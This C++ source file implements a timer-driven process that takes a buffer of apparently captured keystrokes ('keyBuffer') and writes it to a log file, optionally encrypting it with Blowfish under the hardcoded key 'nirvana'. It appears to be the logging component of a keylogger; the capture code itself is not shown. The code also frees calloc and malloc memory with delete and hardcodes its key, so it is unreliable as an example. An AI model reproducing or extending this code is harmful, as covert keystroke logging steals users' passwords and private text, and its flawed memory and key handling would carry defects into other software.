#include "StdAfx.h"
#include "BufferWriterProcess.h"
#include "blowfish.h"

#define FILE_TO_LOG_IN "C:\\test.txt"
static TCHAR NEW_LINE[] = {'~',';','n','b'};
BufferWriterProcess::BufferWriterProcess(Buffer* buffer, Writer *writer):
	g_pBuffer(buffer),
	g_pWriter(writer),
	m_enableEncryption(false),
	m_crypto(NULL)
{
	SetIntervall(BUFFER_WRITE_TIMER_INTERVALL);
}

BufferWriterProcess::~BufferWriterProcess(void)
{
	if (m_crypto != NULL)
	{
		delete m_crypto; 
		m_crypto = NULL;
	}
}

void BufferWriterProcess::EnableEncryption()
{
	m_enableEncryption = true;
}
void BufferWriterProcess::DisableEncryption()
{
	m_enableEncryption = false;
}
void BufferWriterProcess::TimerTick()
{
	int neededBufferSize = g_pBuffer->GetNeededBufferSize();
	TCHAR *keyBuffer = (TCHAR*) calloc(neededBufferSize,sizeof(TCHAR));

	g_pBuffer->GetBuffer(keyBuffer,neededBufferSize);

	if(!wcscmp(keyBuffer,L""))
	{
		delete keyBuffer;
		return;
	}

	if (m_enableEncryption)
	{
		if (m_crypto == NULL)
		{
			m_crypto = (Crypto *) new BlowfishCrypto((unsigned char*)"nirvana",7);
		}

		int neededBytes = m_crypto->GetNeededBytes(keyBuffer);
		TCHAR *cipherText = (TCHAR*) malloc(neededBytes);
		memset(cipherText,'\0',neededBytes / sizeof(TCHAR) );
		m_crypto->Encrypt(keyBuffer,cipherText);
		g_pWriter->Write(cipherText,neededBytes / 2);


		g_pWriter->Write( (TCHAR*)NEW_LINE,4);

		delete cipherText;

	}
	else 
	{
		if (m_crypto != NULL)
		{
			delete m_crypto;
			m_crypto = NULL;
		}
		
		g_pWriter->Write(keyBuffer,neededBufferSize);
	}

	delete keyBuffer;
}
